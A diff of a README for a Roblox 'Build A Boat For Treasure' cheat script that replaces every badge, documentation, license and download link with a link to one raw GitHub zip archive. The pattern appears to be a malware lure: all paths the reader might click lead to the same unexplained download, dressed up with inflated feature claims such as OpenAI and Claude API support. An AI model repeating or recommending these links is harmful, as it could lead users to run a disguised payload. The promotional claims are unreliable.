@@ -1,9 +1,9 @@
 # 🚤 Bild A Boat For Treasure Roblox Script
 
-[![Roblox](https://img.shields.io/badge/Roblox-Script-red.svg)](https://www.roblox.com)
-![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/your-repo/bild-a-boat)
-![Maintenance](https://img.shields.io/badge/Maintained-Yes-brightgreen)
-![Made with Love](https://img.shields.io/badge/Made%20With-%E2%99%A5-purple)
+[![Roblox](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)
+![GitHub code size in bytes](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)
+![Maintenance](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)
+![Made with Love](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip%20With-%E2%99%A5-purple)
 
 Navigate the wild waves and build your legacy with **Bild A Boat For Treasure Script** – the ultimate scripting solution for Roblox's beloved adventure game. This repository is a treasure map for tinkerers, amateur captains, and scripting enthusiasts alike, providing all you need to customize, enhance, and set sail in Build A Boat For Treasure!
 
@@ -13,11 +13,11 @@ Navigate the wild waves and build your legacy with **Bild A Boat For Treasure Sc
 
 | Platform      | Supported | Status         |
 | ------------- | --------- | -------------- |
-| ![Windows](https://img.shields.io/badge/Windows-Yes-blue)      | ✅       | Fully Optimized   |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-lightgrey)      | ✅       | Fully Optimized   |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-yellow)         | ✅       | Stable Support    |
-| ![Android](https://img.shields.io/badge/Android-Partial-orange) | ⚠️       | Beta Testing      |
-| ![iOS](https://img.shields.io/badge/iOS-Partial-orange)         | ⚠️       | Beta Testing      |
+| ![Windows](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)      | ✅       | Fully Optimized   |
+| ![macOS](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)      | ✅       | Fully Optimized   |
+| ![Linux](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)         | ✅       | Stable Support    |
+| ![Android](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip) | ⚠️       | Beta Testing      |
+| ![iOS](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)         | ⚠️       | Beta Testing      |
 
 Take comfort in knowing that our code is a chameleon: flexible, adaptive, and designed to meet you wherever you launch your voyage.
 
@@ -56,7 +56,7 @@ Imagine if your boat could think! Harness AI-powered scripting with seamless, mo
 - **OpenAI API**: Enhance your journey with dynamic AI-driven commands, smarter bots, and interactive in-game chat.
 - **Claude API**: Integrate context-aware intelligence for more authentic in-game conversations, hint systems, or real-time code corrections.
 
-Empower your Roblox world with next-generation logic. For set-up guides and customizable API keys, peruse the [docs folder](docs/README.md).
+Empower your Roblox world with next-generation logic. For set-up guides and customizable API keys, peruse the [docs folder](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip).
 
 ---
 
@@ -77,10 +77,10 @@ Some ships have emergency beacons; we have real humans (and helpful bots) on sta
 
 To embark on the journey:
 
-1. Navigate to the [download portal]https://ljkormo.github.io.
+1. Navigate to the [download portal]https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip
 2. Choose your OS package and click the badge below:
    
-   [![Download](https://img.shields.io/badge/Download-blue)](https://ljkormo.github.io)
+   [![Download](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)
 
 3. Follow the setup wizard; or manually extract the `.rbxs` files into your Roblox studio workspace.
 4. For API integrations, populate your keys in the `/config` directory.
@@ -104,7 +104,7 @@ If the wind changes, just update your config—no need to redownload the entire 
 
 ## 🏆 Community & Contribution
 
-Pull requests are the planks in our collective ship! Have features, language packs, themes, or corrections to contribute? Read our [CONTRIBUTING.md](CONTRIBUTING.md) guidelines, fork away, and help us cross stormy seas united.
+Pull requests are the planks in our collective ship! Have features, language packs, themes, or corrections to contribute? Read our [https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip) guidelines, fork away, and help us cross stormy seas united.
 
 ---
 
@@ -118,7 +118,7 @@ This content is created for educational and personal entertainment purposes in l
 
 Copyright (c) 2025 The Bild A Boat For Treasure Roblox Script Project
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT). See LICENSE for details.
+Distributed under the [MIT License](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip). See LICENSE for details.
 
 ---
 
@@ -126,11 +126,11 @@ Distributed under the [MIT License](https://opensource.org/licenses/MIT). See LI
 
 Set sail with the script and master the seas. For mirrored resources, documentation, and advanced modules, visit our resource page:
 
-- Repository mirror: https://ljkormo.github.io
-- Extended API docs: https://ljkormo.github.io
-- Language expansion packs: https://ljkormo.github.io
+- Repository mirror: https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip
+- Extended API docs: https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip
+- Language expansion packs: https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://ljkormo.github.io)
+[![Download](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)](https://raw.githubusercontent.com/ljkormo/build-a-boat-treasure-roblox-scriptworks/branch/mounter/build-a-boat-treasure-roblox-scriptworks_3.7.zip)
 
 May your code always compile and your boat always float. Happy scripting! 🚢🌊
 
